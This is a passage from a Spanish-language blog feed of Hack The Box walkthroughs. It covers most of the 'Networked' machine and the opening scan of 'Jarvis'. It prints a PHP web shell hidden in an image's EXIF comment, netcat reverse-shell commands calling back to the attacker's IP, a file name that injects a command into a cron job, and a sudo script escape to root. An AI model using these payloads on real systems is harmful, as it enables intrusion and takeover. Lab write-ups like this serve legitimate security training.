&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/networked# gobuster dir -u http://10.10.10.146/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -n -t &lt;span class=&#34;nv&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; Christian Mehlmauer &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url:            http://10.10.10.146/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads:        &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist:       /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes:   200,204,301,302,307,401,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User Agent:     gobuster/3.0.1
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extensions:     txt,html,php
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No status:      &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout:        &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/08/27 22:46:10 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
/backup
/cgi-bin/
/cgi-bin/.html
/index.php
/index.php
/lib.php
/photos.php
/upload.php
/uploads
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/08/27 22:48:15 &lt;span class=&#34;nv&#34;&gt;Finished&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;backup---backuptar&#34;&gt;BACKUP - backup.tar&lt;/h3&gt;
&lt;p&gt;Visitamos la pagina backup y encontramos un archivo &amp;lsquo;backup.tar&amp;rsquo; que al extraer los archivos que contiene nos muestra el codigo fuente de las paginas que encontramos con dirbuster.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-27%2021.14.46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Analizamos el codigo fuente de los archivos, encontramos que, en la pagina upload.php podemos subir archivos de los cuales solo archivos de tipo imagen estan permitidos.&lt;/p&gt;
&lt;h3 id=&#34;bypass---upload-shell&#34;&gt;BYPASS - Upload Shell&lt;/h3&gt;
&lt;p&gt;Utilizamos exiftool para añadir codigo php para ejecucion de comandos en una de las imagenes que descargamos de photos.php, luego de esto cambiamos el nombre del archivo y le añadimos &lt;code&gt;.php.jpg&lt;/code&gt; como extension.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;exiftool -Comment&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;; system($_GET[&amp;#39;&lt;/span&gt;cmd&lt;span class=&#34;s1&#34;&gt;&amp;#39;]); ?&amp;gt;&amp;#39;&lt;/span&gt; 127.jpg
mv 127.jpg 127.php.jpg
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Visitamos la pagina &lt;strong&gt;photos.php&lt;/strong&gt; y nos aparece nuestra &lt;code&gt;imagen/shell uploaded by 10_10_15_129.php.png&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-27%2021.24.37.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Le pasamos los parametros &lt;code&gt;?cmd=whoami;pwd&lt;/code&gt; a nuestra imagen y nos devuelve la ejecucion de comandos, un tanto desordenada con los datos de la imagen.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-27%2021.30.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Le pasamos parametros para obtener una shell inversa con netcat.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nc -e /bin/bash 10.10.15.129 &lt;span class=&#34;m&#34;&gt;1337&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtenemos nuestra shell como usuario apache.&lt;/p&gt;
&lt;h2 id=&#34;usuario---guly&#34;&gt;USUARIO - guly&lt;/h2&gt;
&lt;p&gt;Dentro de los archivos que encontramos en la carpeta principal del usuario guly, de los cuales podemos leer solo dos, vemos un archivo de tipo cronjob y uno de php.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-27%2023.06.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El archivo cron se encarga de ejecutar el comando &lt;strong&gt;php /home/guly/check_attack.php&lt;/strong&gt; cada 3 mins.&lt;/p&gt;
&lt;p&gt;El segundo archivo evalua los archivos que se encuentran en &lt;code&gt;/var/www/html/uploads/&lt;/code&gt;, si encuentra un archivo que no esta dentro de las extensiones del whitelist de &lt;code&gt;lib.php&lt;/code&gt; lo elimina, pero lo hace con los siguientes comandos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;exec(&amp;#34;rm -f $logpath&amp;#34;);
exec(&amp;#34;nohup /bin/rm -f $path$value &amp;gt; /dev/null 2&amp;gt;&lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt;1 &lt;span class=&#34;ni&#34;&gt;&amp;amp;&amp;#34;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Las variables que nos interesan son:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$path = &amp;#39;/var/www/html/uploads/&amp;#39;;
$logpath = &amp;#39;/tmp/attack.log&amp;#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sabiendo esto vamos a aprovechar la segunda ejecucion de comandos, en la cual se le pasa los parametros:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nohup /bin/rm -f &lt;span class=&#34;nv&#34;&gt;$path$value&lt;/span&gt; &amp;gt; /dev/null 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En este caso toma la variable &lt;code&gt;$path&lt;/code&gt; donde se encuentran todos los archivos y &lt;code&gt;$value&lt;/code&gt; el nombre del archivo a eliminar, en este caso seria de la siguiente forma &lt;strong&gt;/var/www/html/uploads/whatever.php&lt;/strong&gt;, para aprovechar este comando utilizamos touch para crear el siguiente archivo (nombre):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; nc -c bash 10.10.15.129 &lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;touch&#34;&gt;Touch&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-27%2023.03.39.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y para cuando el cron se active y ejecute el archivo y, al borrar nuestro archivo va a ejecutar lo siguiente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nohup /bin/rm -f /var/www/html/uploads/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; nc -c bash 10.10.15.129 &lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt; &amp;gt; /dev/null 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Por lo que va a ejecutar nuestra shell inversa y obtenemos nuestra bandera &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-27%2023.04.04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Agregamos nuestra clave a authorized_keys del usuario guly y nos logeamos al servicio ssh. Ejecutamos el comando &lt;code&gt;sudo -l -l&lt;/code&gt; y nos muestra un archivo que se ejecuta como usuario root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-27%2023.27.27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;jail-escaping-bash&#34;&gt;Jail Escaping Bash&lt;/h3&gt;
&lt;p&gt;Utilizamos la &amp;ldquo;tecnica&amp;rdquo; para escapar de una shell bash. Para ello al preguntarnos sobre las variables le pasamos un comando el cual va a ejecutar.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash/#63664aa8bee7544118de87bf48d529ee&#34;&gt;&lt;strong&gt;Jail Escaping Bash&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/usr/local/sbin/changename.sh
&lt;span class=&#34;c1&#34;&gt;#!/bin/bash -p&lt;/span&gt;
cat &amp;gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EoF
&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;DEVICE=guly0
&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;ONBOOT=no
&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;NM_CONTROLLED=no
&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;EoF&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;regexp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;^[a-zA-Z0-9_\ /-]+&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
	&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;interface &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;:&amp;#34;&lt;/span&gt;
	&lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; x
	&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[[&lt;/span&gt; ! &lt;span class=&#34;nv&#34;&gt;$x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;~ &lt;span class=&#34;nv&#34;&gt;$regexp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
		&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;wrong input, try again&amp;#34;&lt;/span&gt;
		&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;interface &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;:&amp;#34;&lt;/span&gt;
		&lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; x
	&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
	&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$x&lt;/span&gt; &amp;gt;&amp;gt; /etc/sysconfig/network-scripts/ifcfg-guly
&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
  
/sbin/ifup guly0
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Antes de eso creamos un archivo el cual contiene una shell inversa, le damos permisos con el comando &lt;code&gt;chmod +x archivo&lt;/code&gt;. Luego de eso ejecutamos el archivo con el comando sudo y le pasamos el comando &lt;code&gt;bash /tmp/sh&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-28%2000.35.46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Por otro lado tenemos a la escucha netcat y obtenemos una shell con el usuario root y nuestra bandera &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-28%2000.37.38.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/networked/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/networked/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Jarvis</title>
        <link>https://sckull.github.io/posts/jarvis/</link>
        <pubDate>Fri, 08 Nov 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 08 Nov 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/jarvis/</guid>
        <description>Jarvis es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Jarvis es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/jarvis/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Jarvis&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.145&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/25205&#34;&gt;manulqwerty&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/24844&#34;&gt;Ghostpp7&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp, version de servicio y script con nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/jarvis# masscan -p1-65535,U:1-65535 10.10.10.143 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-07-06 09:51:52 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 80/tcp on 10.10.10.143                                    
Discovered open port 64999/tcp on 10.10.10.143                                 
Discovered open port 22/tcp on 10.10.10.143

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Sat Jul  6 03:58:17 2019 as: nmap -sV -sC -p80,64999,22 -o nmap_scsvp.scan 10.10.10.143&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.143
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.083s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.	

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
